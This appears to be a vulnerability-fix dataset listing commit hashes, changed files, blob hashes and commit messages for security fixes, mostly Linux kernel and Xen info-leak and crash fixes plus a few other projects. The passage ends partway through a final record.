    a5471f804d994ece8c31df6be0e04d5076b6dfd0
Blob(s) Before Fix: 
    28a96af484b421ee06fffbe87358c1811693c97f
    2a2898ce596e343d555d3bef8bceecc81e15f651
    6e0ccc09b3131112bce0970ca91d5032545b3772
    851edcd6b0982d5a820da29e2145be75bddcff9c
    937d0fcf74bc67d010d6a7ed1cf47b3a7307adbb
    dfe5b66c97e0bc836efed43ad080dec620301306
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 43da5f2e0d0c69ded3d51907d9552310a6b545e8:
net: fix info leak in compat dev_ifconf()\n\nThe implementation of dev_ifconf() for the compat ioctl interface uses an intermediate ifc structure allocated in userland for the duration of the syscall. Though, it fails to initialize the padding bytes inserted for alignment and that for leaks four bytes of kernel stack. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d8a041b7bfe1097af21441cb77d6af95f4f4680
File(s) In Commit: 
    net/netfilter/ipvs/ip_vs_ctl.c
Blob(s) In Commit: 
    72bf32a84874718927a4bcbdc2e26395be00bdd8
Blob(s) Before Fix: 
    84444dda194b61806efaeadde4c2458f502d8283
    b3afe189af61880464ef6562c568016509957293
    d43e3c122f7bdc5b042b92ce74981149922faa78
    dd811b8dd97c66a9da387a4e37073c47e8dc4407
    f5589987fc80d59a8d1fc5ec1e546d72562521fa
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2d8a041b7bfe1097af21441cb77d6af95f4f4680:
ipvs: fix info leak in getsockopt(IP_VS_SO_GET_TIMEOUT)\n\nIf at least one of CONFIG_IP_VS_PROTO_TCP or CONFIG_IP_VS_PROTO_UDP is not set, __ip_vs_get_timeouts() does not fully initialize the structure that gets copied to userland and that for leaks up to 12 bytes of kernel stack. Add an explicit memset(0) before passing the structure to __ip_vs_get_timeouts() to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Wensong Zhang <wensong@linux-vs.org> Cc: Simon Horman <horms@verge.net.au> Cc: Julian Anastasov <ja@ssi.bg> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7b07f8eb75aa3097cdfd4f6eac3da49db787381d
File(s) In Commit: 
    net/dccp/ccids/ccid3.c
Blob(s) In Commit: 
    119c04317d48eed4abcb2bbf6071062c8d9784fd
Blob(s) Before Fix: 
    03fcf3ee15346cb450d76f314fd3c137a16ed50f
    12877a1514e7b8e873cd26529e58f7ebaae99c1a
    184807b84bd82006df94035644097dfca5079c63
    34dcc798c457b4f11b058f43303f4af231361b2b
    3d604e1349c0b0e5d94ff755a90c7dd395b92a24
    4caf63f0ef052caff83110f475422875df4d3cbd
    560627307200d5d63714c67d5a59b494b687f513
    70bfaf2d1965fdd74ec112fca79a4041e0e1a1b4
    8b5ba6dffac7ebc88fd21075793dc3db43a74a43
    8c67bedf85b01a4f45507483f3cc8e2f49e8cf19
    9a35373a4ba14839862f3fb0e7f2bfb44b5d37e4
    9ef9bee9610ffabbd041a7cdd82a1621d15f1129
    b658f3b8a23cf4f26c9eb39c0d547f80ba54a0f4
    b913ee062a81c9a09d66a6bdb2ebe5db5965ed6b
    ce0d1403b9caff475ab1ae9f76bd1c48c9037381
    d3235899c7e3392ea2ef24ecc0a60c74e87ed508
    d65e98798ecaff29110a2ff303d500482162df66
    ec7fa4d67f080c344ba38c8915b004c1a8e3b9cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7b07f8eb75aa3097cdfd4f6eac3da49db787381d:
dccp: fix info leak via getsockopt(DCCP_SOCKOPT_CCID_TX_INFO)\n\nThe CCID3 code fails to initialize the trailing padding bytes of struct tfrc_tx_info added for alignment on 64 bit architectures. It that for potentially leaks four bytes kernel stack via the getsockopt() syscall. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3592aaeb80290bda0f2cf0b5456c97bfc638b192
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    c2190005a11410e2f95141fb841dadc051157a8b
Blob(s) Before Fix: 
    2da8d14c28ce93eec8f3bbbe16e1f01c3571358e
    582612998211d24aa8d4aea919eed1ba1e994db3
    88709882c4641f7d147fbeaa9f48323cfc8637eb
    8c2919ca36f63c6751b612e3008fd8057aba9944
    a13c3e23e2b85369832975b7566591cc3bf22a03
    a18e6c3d36e37e699089ed5e0910c857da073d1c
    b9bef2c750267cfd0adeaf918c1cc5503461d3db
    c9d04318ec41860d695393603c60de344bb31ebd
    dfd3a648a55107bda2ff14adb6f9e91c06449240
    f6fe4d400502df780e1f57e574e5b4a1574b7f8d
    fe5453c3e71931476823da9d78d755d521487db0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 3592aaeb80290bda0f2cf0b5456c97bfc638b192:
llc: fix info leak via getsockname()\n\nThe LLC code wrongly returns 0, i.e. "success", when the socket is zapped. Together with the uninitialized uaddrlen pointer argument from sys_getsockname this leads to an arbitrary memory leak of up to 128 bytes kernel stack via the getsockname() syscall.\n\nReturn an error instead when the socket is zapped to prevent the info leak. Also remove the unnecessary memset(0). We don't directly write to the memory pointed by uaddr but memcpy() a local structure at the end of the function that is properly initialized.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    04d4fbca1017c11381e7d82acea21dd741e748bc
File(s) In Commit: 
    net/l2tp/l2tp_ip6.c
Blob(s) In Commit: 
    927547171bc7119f57a7b8afecf453ec5eeabf61
Blob(s) Before Fix: 
    0291d8d85f302f3a244a13c0d6a6a6465137882e
    35e1e4bde58730d8395e2870d552230bca3a9c3d
    c74f5a91ff6a3213209c23ff488f0b475a552857
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 04d4fbca1017c11381e7d82acea21dd741e748bc:
l2tp: fix info leak via getsockname()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_unused member of struct sockaddr_l2tpip6 and that for leaks two bytes kernel stack via the getsockname() syscall. Initialize l2tp_unused with 0 to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: James Chapman <jchapman@katalix.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc
File(s) In Commit: 
    drivers/net/tun.c
Blob(s) In Commit: 
    f55c46222613f01f44b14f3455c38d832b2fc6fe
Blob(s) Before Fix: 
    c62163e272cd8548ab0586e6655a4d04d98bcb08
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc:
net/tun: fix ioctl() based info leaks\n\nThe tun module leaks up to 36 bytes of memory by not fully initializing a structure located on the stack that gets copied to user memory by the TUNGETIFF and SIOCGIFHWADDR ioctl()s.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0143fc5e9f6f5aad4764801015bc8d4b4a278200
File(s) In Commit: 
    fs/udf/namei.c
Blob(s) In Commit: 
    c31deb382afd006f26072d6744976b4258bcc202
Blob(s) Before Fix: 
    18024178ac4c040a3f23181ff2dc1a5cc48f2dc8
    78bff11169ea0f7aa66267f696b3eceb87c741cf
    fc60a3f73a144802fd47282781694c9e0c232444
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0143fc5e9f6f5aad4764801015bc8d4b4a278200:
udf: avoid info leak on export\n\nFor type 0x51 the udf.parent_partref member in struct fid gets copied uninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    fe685aabf7c8c9f138e5ea900954d295bf229175
File(s) In Commit: 
    fs/isofs/export.c
Blob(s) In Commit: 
    1d3804492aa77d7ca4440d087fd415febc2e3681
Blob(s) Before Fix: 
    2b4f2358eadbb063fab1fb2c275e9cad1151bd6c
    aa4356d09eeeb03167bcf506a7fe8ad98efaba39
    dd4687ff30d09900a14f113aec870007cfcfb7f0
    e81a30593ba9aa1b1e857032f3a6a6faac82aea8
    ed752cb3847426f108803af94566ba79d80786ed
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fe685aabf7c8c9f138e5ea900954d295bf229175:
isofs: avoid info leak on export\n\nFor type 1 the parent_offset member in struct isofs_fid gets copied uninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    fdf5af0daf8019cec2396cdef8fb042d80fe71fa
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    0cbb44076cfa506b3223de5edf39fb10849a0af8
Blob(s) Before Fix: 
    52b5c2d0ecd0aee7c99d1f31e8bf3a1115a293b9
    78dd38cd5496d38f8b708996f17ce5d571599a96
    d73aab3fbfc0de018fa8125421caf3014c89dfbc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fdf5af0daf8019cec2396cdef8fb042d80fe71fa:
tcp: drop SYN+FIN messages\n\nDenys Fedoryshchenko reported that SYN+FIN attacks were bringing his linux machines to their limits.\n\nDont call conn_request() if the TCP flags includes SYN flag\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6f7b0a2a5c0fb03be7c25bd1745baa50582348ef
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    3717e7b306e08c0e8c2d3a66219c3cae13176d99
Blob(s) Before Fix: 
    1614be20173dcb19ef45e65fa25d07f8d3c65194
    473c7502077adb1ea264d876f505e5c5c4989a3e
    4bde103f2019c916b3076d5d9bd696e84b296126
    5551adaf7cdfda74095b62bb1cfffaf0953fb33b
    5b82d1a53e78da684bb5bf86b06389cfe4f3de1f
    6c683b37f2ce25291a5a0c8f490a16c08c84d674
    7a0a4ed784911c160ef19660159cf4218f16fc0f
    866c9d5959ddc9eb1a689657c3e1e623c8e3fd02
    887943044d46781a27041636f389e54e0358db20
    9c5ffe1355b09e2416181505c807a60146faade6
    a6abeb7cbe29ad1fa40bb5e8a3212692adaa69be
    b26dcfc02c9489b3ca00bfd076f2208bb4964366
    b6552c3e874609e9d05d1fd753a288b17c1854cc
    b766d28accd6be8dc2b735de11aa004514b8f91b
    cdf5267ee53d09df70b4e8e137a533b8e9a8f728
    d202426544cc13946fd37dffdb734178b041da3a
    e2b0fb9a0b3b3d0d5871ee37bf08618a6bf052e7
    e564a9a3ea2a761902e15139588cb181878afcfa
    e6160fa842e4951a215290f841e4ec1fddf31b7c
    eda12240978af7fe8f97e26634c2ffe6796edd86
    fe28dc282eae43af920d2937e8f9c5dc631ffa43
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6f7b0a2a5c0fb03be7c25bd1745baa50582348ef:
futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call. If we attempt this, as the trinity test suite manages to do, we miss early wakeups as q.key is equal to key2 (because they are the same uaddr). We will then attempt to dereference the pi_mutex (which would exist had the futex_q been properly requeued to a pi futex) and trigger a NULL pointer dereference.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com> Cc: Dave Jones <davej@redhat.com> Cc: stable@vger.kernel.org Link: http://lkml.kernel.org/r/ad82bfe7f7d130247fbe2b5b4275654807774227.1342809673.git.dvhart@linux.intel.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>\n\n

======================================================================
Commit With Fix: 
    3e10986d1d698140747fcfc2761ec9cb64c1d582
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    a6000fbad2949f58a079322f4e328e0c051df896
Blob(s) Before Fix: 
    002939cfc069d2fe5eabe9b8ec4cefc1e20b2112
    02f8dfe320b771ee96ba3bb5bae52b2974608bd8
    0f8402ea434b134694584c0482ce04ba2bf0d756
    2676a88f533e60d969b41f3ddf85313b6bd43a71
    30579207612175f0a65b19310368079c54ce4bc9
    3eed5424e659a1ab130324d16bfe3c0af4ab2feb
    4538a34af2a00119c03b5230040f890f94204c65
    6b654b3ddfda2a9a03f77bc1d2a5476a2c25e9d4
    6e819780c23252b3387c1b2daec25a261fa1f2fb
    8a146cfcc366fbead42d31d882893a74ec8dcf4e
    8f67ced8d6a808689255435dd412df132138af65
    9e5b71fda6ec0d726bd356bce1658f55091ebcf8
    b23f174ab84c3b6c72302834d8e13695d22a1c6c
    b2e14c07d9205467f0a8d83af3fe6108d277a15f
    d4aee72d5263cc6fbe6d66df3b7bf0b0174dd264
    fcf8fdf5307a0fe56af706f9f8b44d29eb8ac3f3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 3e10986d1d698140747fcfc2761ec9cb64c1d582:
net: guard tcp_set_keepalive() to tcp sockets\n\nIts possible to use RAW sockets to get a crash in tcp_set_keepalive() / sk_reset_timer()\n\nFix is to make sure socket is a SOCK_STREAM one.\n\nReported-by: Dave Jones <davej@redhat.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    20e1db19db5d6b9e4e83021595eab0dc8f107bef
File(s) In Commit: 
    net/netlink/af_netlink.c
Blob(s) In Commit: 
    527023823b5c5ea1a48c373b49e9f1688891a494
Blob(s) Before Fix: 
    0e6776005382e8a47fe0ff5f53938f7436f8cd1a
    1201b6d4183d8993b1175119978a3baee4481eec
    1445d73533ed13ac9aa43dd85d6f58b4a006c130
    478181d53c555dc0d7cf9a18714aa0a08b03f3e1
    5463969da45b9a30dbbb1802624b0e9e8bf92a29
    5d37fbc74702294a53875adcf7f0af4def258953
    629b06182f3faab89ec771df253575ed467b6a2a
    9172179becfb2c81c2b261d251804bdddecb957f
    b3025a603d56b21f1529262025cc2d6f00993cc9
    faa48f70b7c9b132bfaf3c8ce561982e82c4c7b6
    fc91ff6907cb4f715fc0e47f55e8629718ea2cf4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 20e1db19db5d6b9e4e83021595eab0dc8f107bef:
netlink: fix possible spoofing from non-root processes\n\nNon-root user-space processes can send Netlink messages to other processes that are well-known for being subscribed to Netlink asynchronous notifications. This allows ilegitimate non-root process to send forged messages to Netlink subscribers.\n\nThe userspace process usually verifies the legitimate origin in two ways:\n\na) Socket credentials. If UID != 0, then the message comes from    some ilegitimate process and the message needs to be dropped.\n\nb) Netlink portID. In general, portID == 0 means that the origin    of the messages comes from the kernel. Thus, discarding any    message not coming from the kernel.\n\nHowever, ctnetlink sets the portID in event messages that has been triggered by some user-space process, eg. conntrack utility. So other processes subscribed to ctnetlink events, eg. conntrackd, know that the event was triggered by some user-space action.\n\nNeither of the two ways to discard ilegitimate messages coming from non-root processes can help for ctnetlink.\n\nThis patch adds capability validation in case that dst_pid is set in netlink_sendmsg(). This approach is aggressive since existing applications using any Netlink bus to deliver messages between two user-space processes will break. Note that the exception is NETLINK_USERSOCK, since it is reserved for netlink-to-netlink userspace communication.\n\nStill, if anyone wants that his Netlink bus allows netlink-to-netlink userspace, then they can set NL_NONROOT_SEND. However, by default, I don't think it makes sense to allow to use NETLINK_ROUTE to communicate two processes that are sending no matter what information that is not related to link/neighbouring/routing. They should be using NETLINK_USERSOCK instead for that.\n\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ed28c1ba666b39581adb860bf51cdde43c84cc89
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    be74e6aa341f5fa3581b29051bcfe874d7df3936
Blob(s) Before Fix: 
    2e1c751c4c496b635b4598c959d390f3edb0bc0a
Projects:
    0x277F_inspircd
Commit Message for ed28c1ba666b39581adb860bf51cdde43c84cc89:
Fixed out of bounds memory access from malformed DNS queries that have an invalid length label. Introduced in a6a07de0daa353bcd29056a4535a9c4784c113c8.

======================================================================
Commit With Fix: 
    a70b52ec1aaeaf60f4739edb1b422827cb6f3893
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    e7f2fad7b4ce7cae2d334456f5d9998e795c917e
Blob(s) Before Fix: 
    01be7f60a8af83beffd02c4f467db99dfde15995
    02a2c9340573cf5946e0083187353d4517319844
    07df3f8e6d758fbb5d6dcd6fb8cd4ad19c644dd3
    143e32a991b37d53859113c68e9377b4276905ba
    1cf12b3dd83a0654d7c0629786d8ab7fd4388a23
    278ed7dc71bbc11cbadb4603fe40507e75d20741
    2eea1cacd8d8a69ccf8da9c4b37224622e4e7b50
    3b65ee767ce6013f3afd80e4f0c4cb6414cd3f33
    3fc2bb31bed28c5bd24623afaf7222ed64eed253
    4d5166969662750a39bc2d58469a26d6b43623fc
    5ee63ac875a5b79d3d93764407b66bd2b25d2474
    67a6db3e1b6f83677009d2323c54dccd38dea63d
    70a611fef14a0f1253a46468ae987a4b7b128529
    78c514cfd212d66b8e6311d4a25435be6493c26d
    78ee9479051da9c495db7a911696766a729c6f75
    969beb0e22311a4f7e7f4155524709d5dd8269bf
    a7b4882a5ab5ff5be3c79f5165aac058f079debe
    a7e3bb252708f104492c4bd2f219d714ecd8cc4e
    b4a88ccf777e7cb3be5a90e0e347ebacf6234b67
    b9d64d89a0437aa4db5b26bf07e1ecb870d6fba1
    bbb837d15414af40a3dd14733474ddf7ea8fa84e
    c4ee8a72e7b5be89a1f405fe6ecc427c806581ae
    c7acaf3167aa88652860d5c995a5117af7247b2d
    cdc8dc493ed94fbd64c1660ea5bbbb66598596a1
    d1152f89f1f547b30ab12d26314e8227bcaecdab
    da5f6b325c775ac305e707e567d801a5515ad5b9
    da887604dfc51929cd4cc17b10a943645b4618ef
    de8a503a313c52743baae31451c89737a3c1c492
    e29ec485af255822b8414be128fc8ef66da9a204
    ecc551c0aa989aec59236b935a58edbd1d8c096a
    f41688cc6d146c65e22bfee5a7b02ab9f8087572
    f56a477b1a2593b0945f6a78737816369cfb7fae
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a70b52ec1aaeaf60f4739edb1b422827cb6f3893:
vfs: make AIO use the proper rw_verify_area() area helpers\n\nWe had for some reason overlooked the AIO interface, and it didn't use the proper rw_verify_area() helper function that checks (for example) mandatory locking on the file, and that the size of the access doesn't cause us to overflow the provided offset limits etc.\n\nInstead, AIO did just the security_file_permission() thing (that rw_verify_area() also does) directly.\n\nThis fixes it to do all the proper helper functions, which not only means that now mandatory file locking works with AIO too, we can actually remove lines of code.\n\nReported-by: Manish Honap <manish_honap_vit@yahoo.co.in> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    b35cc8225845112a616e3a2266d2fde5ab13d3ab
File(s) In Commit: 
    sound/core/compress_offload.c
Blob(s) In Commit: 
    68fe02c7400a29c8b4584b45a44ed75205950b2b
Blob(s) Before Fix: 
    a68aed7fce0205462ce08183f560015eeb0060cb
    bd7f28e8925404d03b9e9f83d16f20aa09269e8b
    eb60cb8dbb8a6f12d965912e923197cdd2f4e8b5
    ec2118d0e27aca3f5fef6c2ddd72f8b166ce98ca
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b35cc8225845112a616e3a2266d2fde5ab13d3ab:
ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()\n\nThese are 32 bit values that come from the user, we need to check for integer overflows or we could end up allocating a smaller buffer than expected.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    82981930125abfd39d7c8378a9cfdf5e1be2002b
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    10605d2ec8606ad2860c88903aa2572bd914ab51
Blob(s) Before Fix: 
    0431aaf7473a2e6e3cc0252cec8c70f454d627e5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 82981930125abfd39d7c8378a9cfdf5e1be2002b:
net: cleanups in sock_setsockopt()\n\nUse min_t()/max_t() macros, reformat two comments, use !!test_bit() to match !!sock_flag()\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    524465f70a32d0eb6bf047e6a05c76c22d52bfa2
File(s) In Commit: 
    port-proxy/bin/openshift-port-proxy-cfg
Blob(s) In Commit: 
    d9de32220a98f726074f8fc35b65e01df0cbc535
Blob(s) Before Fix: 
    8e1223a0c64eea38beaafe7ac7a4843cdfc18514
Projects:
    2014cdag21_origin-server
Commit Message for 524465f70a32d0eb6bf047e6a05c76c22d52bfa2:
Cleanup

======================================================================
Commit With Fix: 
    22531545514043e04633e1c015c7540b9de9dbe4
File(s) In Commit: 
    libarchive/archive_write.c
Blob(s) In Commit: 
    be85621508d51df04ccedb3910cfe08e0dfa5b4f
Blob(s) Before Fix: 
    6fc3907f3631b9f0eb015ce04623befb07ce19ca
    a3d1a3380c05b8ac3799211ce4bbe2d4b8b3676b
    eede5e05756d2c535a8e74c866972b019186c12e
Projects:
    AasemShokr_libarchive
Commit Message for 22531545514043e04633e1c015c7540b9de9dbe4:
Limit write requests to at most INT_MAX. This prevents a certain common programming error (passing -1 to write) from leading to other problems deeper in the library.

======================================================================
Commit With Fix: 
    7d5145d8eb2b9791533ffe4dc003b129b9696c48
File(s) In Commit: 
    drivers/net/xen-netback/netback.c
Blob(s) In Commit: 
    bf692df966a9d7c7fecb18fbd0ea85c6be405e55
Blob(s) Before Fix: 
    c2e3336b4f98a8ddda64686ade22e6826aecbb29
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7d5145d8eb2b9791533ffe4dc003b129b9696c48:
xen/netback: don't leak pages on failure in xen_netbk_tx_check_gop.\n\nSigned-off-by: Matthew Daley <mattjd@gmail.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Acked-by: Ian Campbell <ian.campbell@citrix.com> Acked-by: Jan Beulich <JBeulich@suse.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    13d2b4d11d69a92574a55bfd985cfb0ca77aebdc
File(s) In Commit: 
    arch/x86/xen/xen-asm_32.S
Blob(s) In Commit: 
    33ca6e42a4caabb412350563a1f8349fd77b7789
Blob(s) Before Fix: 
    0ded929e459ffa3dd3836128444073ad3806aa36
    22a2093b58623cca3472a03c3950cad4395a884d
    7328f71651e1605fee50560e37a548901593067a
    b040b0e518caf0a0fe382999b36c2c04e7344860
    f9643fc50de571636347a1e0510d45f916728967
    fd92a64d748e1ca1a3838fe3c26f977f41a8b984
    feb6d40a0860f450d5e2c29f2920a139c98794f8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 13d2b4d11d69a92574a55bfd985cfb0ca77aebdc:
x86/xen: don't assume %ds is usable in xen_iret for 32-bit PVOPS.\n\nThis fixes CVE-2013-0228 / XSA-42\n\nDrew Jones while working on CVE-2013-0190 found that that unprivileged guest user in 32bit PV guest can use to crash the > guest with the panic like this:\n\n------------- general protection fault: 0000 [#1] SMP last sysfs file: /sys/devices/vbd-51712/block/xvda/dev Modules linked in: sunrpc ipt_REJECT nf_conntrack_ipv4 nf_defrag_ipv4 iptable_filter ip_tables ip6t_REJECT nf_conntrack_ipv6 nf_defrag_ipv6 xt_state nf_conntrack ip6table_filter ip6_tables ipv6 xen_netfront ext4 mbcache jbd2 xen_blkfront dm_mirror dm_region_hash dm_log dm_mod [last unloaded: scsi_wait_scan]\n\nPid: 1250, comm: r Not tainted 2.6.32-356.el6.i686 #1 EIP: 0061:[<c0407462>] EFLAGS: 00010086 CPU: 0 EIP is at xen_iret+0x12/0x2b EAX: eb8d0000 EBX: 00000001 ECX: 08049860 EDX: 00000010 ESI: 00000000 EDI: 003d0f00 EBP: b77f8388 ESP: eb8d1fe0  DS: 0000 ES: 007b FS: 0000 GS: 00e0 SS: 0069 Process r (pid: 1250, ti=eb8d0000 task=c2953550 task.ti=eb8d0000) Stack:  00000000 0027f416 00000073 00000206 b77f8364 0000007b 00000000 00000000 Call Trace: Code: c3 8b 44 24 18 81 4c 24 38 00 02 00 00 8d 64 24 30 e9 03 00 00 00 8d 76 00 f7 44 24 08 00 00 02 80 75 33 50 b8 00 e0 ff ff 21 e0 <8b> 40 10 8b 04 85 a0 f6 ab c0 8b 80 0c b0 b3 c0 f6 44 24 0d 02 EIP: [<c0407462>] xen_iret+0x12/0x2b SS:ESP 0069:eb8d1fe0 general protection fault: 0000 [#2] ---[ end trace ab0d29a492dcd330 ]--- Kernel panic - not syncing: Fatal exception Pid: 1250, comm: r Tainted: G      D    --------------- 2.6.32-356.el6.i686 #1 Call Trace:  [<c08476df>] ? panic+0x6e/0x122  [<c084b63c>] ? oops_end+0xbc/0xd0  [<c084b260>] ? do_general_protection+0x0/0x210  [<c084a9b7>] ? error_code+0x73/ -------------\n\nPetr says: "  I've analysed the bug and I think that xen_iret() cannot cope with  mangled DS, in this case zeroed out (null selector/descriptor) by either  xen_failsafe_callback() or RESTORE_REGS because the corresponding LDT  entry was invalidated by the reproducer. "\n\nJan took a look at the preliminary patch and came up a fix that solves this problem:\n\n"This code gets called after all registers other than those handled by IRET got already restored, hence a null selector in %ds or a non-null one that got loaded from a code or read-only data descriptor would cause a kernel mode fault (with the potential of crashing the kernel as a whole, if panic_on_oops is set)."\n\nThe way to fix this is to realize that the we can only relay on the registers that IRET restores. The two that are guaranteed are the %cs and %ss as they are always fixed GDT selectors. Also they are inaccessible from user mode - so they cannot be altered. This is the approach taken in this patch.\n\nAnother alternative option suggested by Jan would be to relay on the subtle realization that using the %ebp or %esp relative references uses the %ss segment.  In which case we could switch from using %eax to %ebp and would not need the %ss over-rides. That would also require one extra instruction to compensate for the one place where the register is used as scaled index. However Andrew pointed out that is too subtle and if further work was to be done in this code-path it could escape folks attention and lead to accidents.\n\nReviewed-by: Petr Matousek <pmatouse@redhat.com> Reported-by: Petr Matousek <pmatouse@redhat.com> Reviewed-by: Andrew Cooper <andrew.cooper3@citrix.com> Signed-off-by: Jan Beulich <jbeulich@suse.com> Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

======================================================================
Commit With Fix: 
    2d746ee9083c184f1234d8fed311e89bdd1b39e5
File(s) In Commit: 
    src/flash/plupload/src/com/plupload/Plupload.as
Blob(s) In Commit: 
    2c4981f6550ef4668dfb9437bc62df9b54700735
Blob(s) Before Fix: 
    84f1ff1903d593b343d3907a6dc23f8425073034
Projects:
    1165013968_plupload
Commit Message for 2d746ee9083c184f1234d8fed311e89bdd1b39e5:
Flash: Sanitize id (allow only letters, digits and underscore).

======================================================================
Commit With Fix: 
    b3f456a8ceefac6e9f2e9acc2ea0c159d412b595
File(s) In Commit: 
    exec/totemcrypto.c
Blob(s) In Commit: 
    90cbb248b5231c0b944c6517cea6ac600ab759e8
Blob(s) Before Fix: 
    44faaaf5027aa274190dcf300f0bbbcbd3f45652
Projects:
    6779660_corosync
Commit Message for b3f456a8ceefac6e9f2e9acc2ea0c159d412b595:
totemcrypto: fix hmac key initialization\n\nSigned-off-by: Fabio M. Di Nitto <fdinitto@redhat.com> Reviewed-by: Jan Friesse <jfriesse@redhat.com>

======================================================================
Commit With Fix: 
    6f237e4c9fab649d3750482514f0fde76c56ab30
File(s) In Commit: 
    lib/rack/file.rb
Blob(s) In Commit: 
    ee58a1a71baf29031617dcd02fb0265e349c8830
Blob(s) Before Fix: 
    090a001510c9a3949cc7d87ec1219fca549d8b75
    2bb31b9e3a9e4055c2b9f7d5205bd20fd034df41
    a034ea90c6fc2d75993433a934ab2ec4a8be49ee
Projects:
    040mike_rack
Commit Message for 6f237e4c9fab649d3750482514f0fde76c56ab30:
Prevent symlink path traversals\n\n * Closes CVE-2013-0262

======================================================================
Commit With Fix: 
    7da792fbd40c0e6eae1ee093aa00e0b177bd2ebc
File(s) In Commit: 
    manifests/base.pp
Blob(s) In Commit: 
    dd00f734785eb5d9fe45fd6e770b6d1ff9b70e90
Blob(s) Before Fix: 
    01e2acaced5a895624751fa07e08f4ddf5c99163
Projects:
    131_puppetlabs-apache
Commit Message for 7da792fbd40c0e6eae1ee093aa00e0b177bd2ebc:
Restrict permissions on cinder configuration\n\nPrior to this commit, the puppetlabs-cinder module applied the mode 0644 to the File[$::cinder::params::cinder_conf] resource which were too permissive. This commit explicitly sets the mode to 0600.

======================================================================
Commit With Fix: 
    c903f0456bc69176912dee6dd25c6a66ee1aed00
File(s) In Commit: 
    arch/x86/kernel/msr.c
Blob(s) In Commit: 
    4929502c1372db979d7e1b176b22a9981e8ec96e
Blob(s) Before Fix: 
    113e70784854fb55bdc0eb08fe5e38bee4946126
    12fcbe2c143e5e3c7a9e62f58981a78f5355bd64
    686c291cb6883da164c2e7b6717c446a9aefc6ed
    8563b64e18cf766e472b2719db65747c5a2fb1c0
    a7c5661f84962a2f6eb80509c1791392352a6fc8
    eb113693f04320e927a6a2856124b97d70d4f6ce
    f7d1a649a5b2d0db47cb5af6ec31842d58c5d9a1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
